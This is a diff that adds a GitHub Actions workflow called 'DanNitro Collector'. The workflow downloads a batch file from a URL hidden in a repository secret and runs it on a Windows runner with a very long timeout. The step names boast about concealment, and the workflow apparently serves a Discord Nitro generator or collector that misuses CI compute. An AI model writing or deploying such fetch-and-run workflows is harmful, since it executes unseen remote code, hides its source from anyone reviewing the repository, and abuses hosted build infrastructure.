@@ -1,0 +1,19 @@
+name: DanNitro Collector
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: grabbing stuff ig
+    runs-on: windows-latest
+    timeout-minutes: 9999
+    
+    steps:
+      - name: Installing and configuring gen with proxies (you thought this was public huh)
+        run: Invoke-WebRequest -Uri "$Env:AntiCopyFeature" -OutFile "Preparation.bat"
+        env:
+             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID2 }}
+
+      - name: running the collector 🔥🔥
+        run: cmd /c Preparation.bat
